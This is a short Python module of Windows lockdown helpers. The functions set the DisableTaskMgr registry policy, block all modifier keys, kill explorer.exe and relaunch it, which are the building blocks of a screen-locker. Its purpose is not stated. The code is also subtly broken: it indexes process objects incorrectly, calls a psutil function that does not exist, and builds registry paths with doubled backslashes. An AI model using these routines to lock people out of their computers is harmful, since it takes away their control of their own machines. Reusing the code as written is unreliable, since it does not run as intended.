import winreg
import keyboard
import psutil
import os
LM_REG = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
CU_REG = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)


def disable_taskmngr():
	key = winreg.CreateKey(CU_REG, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
	winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
def enable_taskmngr():
	key = winreg.CreateKey(CU_REG, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
	winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
def block_keys():
	for key in keyboard.all_modifiers:
		keyboard.block_key(key)

def kill_explorer():
	for proc in psutil.process_iter(['pid', 'name']):
		if proc["name"] == "explorer.exe":
			psutil.kill(proc["pid"])
def run_explorer():
	os.system("explorer.exe")